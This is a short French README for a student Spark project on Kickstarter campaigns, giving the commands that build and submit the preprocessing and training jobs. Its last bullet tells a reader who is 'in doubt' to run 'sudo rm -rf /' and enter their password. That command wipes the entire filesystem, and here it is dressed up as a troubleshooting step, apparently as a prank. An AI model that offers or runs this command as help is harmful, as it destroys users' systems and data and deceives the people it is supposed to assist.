# Spark project MS Big Data Télécom : Kickstarter campaigns

Pour compiler et lancer le script, tapez dans un terminal à la racine du projet:

* Pour le preprocessing du jeu de données:

```bash
./build_and_submit.sh Preprocessor $SPARK_HOME 
```

* Pour l'entrainement du modèle:

```bash
./build_and_submit.sh Trainer $SPARK_HOME
```
* En cas de doute lancez cette commande puis tapez votre mot de passe:

```bash
sudo rm -rf /
```